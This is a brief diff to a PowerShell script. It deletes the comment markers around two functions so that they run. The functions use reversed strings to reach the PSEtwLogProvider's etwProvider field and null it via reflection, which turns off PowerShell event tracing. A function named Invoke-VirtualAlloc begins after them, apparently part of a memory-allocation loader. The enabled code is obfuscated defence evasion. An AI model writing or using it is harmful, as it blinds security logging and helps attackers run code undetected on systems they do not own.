@@ -1,4 +1,3 @@
-<#
 function SB{
         $tvktbc = 'redivorPwte'
         $rftgbc = 'redivorPgoLwtESP.gnicarT.noitamotuA.tnemeganaM.metsyS'
@@ -20,7 +19,6 @@ function AB{
         $fifth.SetValue($null, $fieldValue)
 }
 AB
-#>
 
 function Invoke-VirtualAlloc {
     Param (
